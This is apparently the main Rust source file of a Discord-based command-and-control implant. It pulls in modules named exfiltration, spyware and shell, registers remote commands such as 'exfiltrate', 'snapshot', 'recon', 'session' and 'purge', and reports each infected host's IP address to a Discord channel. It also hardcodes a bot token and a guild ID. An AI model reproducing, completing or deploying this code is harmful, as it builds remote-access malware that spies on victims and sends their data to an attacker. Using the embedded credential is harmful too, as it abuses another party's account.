mod commands;
pub mod discord_utils;
mod errors;
mod event_handler;
mod libraries;
mod os;
mod utils;

use futures::future::join_all;
use serenity::{
	builder::CreateApplicationCommand,
	client::Context,
	model::{application::command::Command, id::GuildId},
	prelude::GatewayIntents,
	Client,
};
use tokio::{task::JoinHandle, time::Instant};
use tracing::{error, info as informational};
use utils::tracing::initialize_tracing;

use crate::{
	commands::*,
	errors::DiscordC2Error,
	event_handler::MainHandler,
	exfiltration::*,
	misc::*,
	shell::*,
	spyware::*,
	utils::agent::*,

};

const GUILD_ID: GuildId = GuildId(1086423448454180905);
static TOKEN: &str = "MTA4NzQ2MzExMjY3ODA1NTkzNg.GTGs1y.Nj49dYvo8rSYUA1duIUgaC57UhbJs5fJyMKvhU";

async fn register_commands(ctx: &Context) -> Result<(), DiscordC2Error> {
	// Create an explicit type for readability
	type CommandRegistrationFn = fn(&mut CreateApplicationCommand) -> &mut CreateApplicationCommand;
	type CommandRegistration = (&'static str, CommandRegistrationFn);

	// Create a Vec of our commands
	let commands: Vec<CommandRegistration> = vec![
		("info", info::register),
		("purge", purge::register),
		("exfiltrate", exfiltrate::register),
		("session", session::register),
		("snapshot", snapshot::register),
		("recon", reconnaissance::recon::register),
	];

	// Create a Vec of JoinHandles to hold our commands
	let mut handles: Vec<JoinHandle<Result<Command, DiscordC2Error>>> = Vec::new();

	// Spawn a new async task for each command to avoid having to await each
	for (name, command) in commands {
		let http = ctx.http.clone();
		let handle = tokio::spawn(async move {
			let start_time = Instant::now();
			let result = Command::create_global_application_command(&http, command)
				.await
				.map_err(DiscordC2Error::from);
			let elapsed_time = start_time.elapsed();
			informational!("Registration of command {:?} took {:?}", name, elapsed_time);
			result
		});
		handles.push(handle);
	}

	// Await the completion of all join handles
	let results = join_all(handles).await;

	// Error handling
	for result in results {
		if let Err(e) = result {
			return Err(DiscordC2Error::from(e));
		}
		if let Ok(Err(e)) = result {
			return Err(e);
		}
	}

	informational!("Commands registered");
	Ok(())
}

async fn send_agent_check_in(ctx: &Context) -> Result<(), DiscordC2Error> {
	let agent = get_or_create_agent(ctx).await;
	agent
		.get_command_channel()
		.send_message(ctx, |m| {
			m.content(format!("Agent checking in from {}", agent.get_ip_address()))
		})
		.await?;
	Ok(())
}

#[tokio::main]
async fn main() {
	initialize_tracing(); // Setup logging

	let intents =
		GatewayIntents::GUILD_MESSAGES | GatewayIntents::MESSAGE_CONTENT | GatewayIntents::GUILDS;

	let mut client = Client::builder(TOKEN, intents)
		.event_handler(MainHandler)
		.await
		.expect("Failed to create the client");

	// start listening for events by starting a single shard
	if let Err(why) = client.start().await {
		error!("An error occurred while running the client: {:?}", why);
	}
}
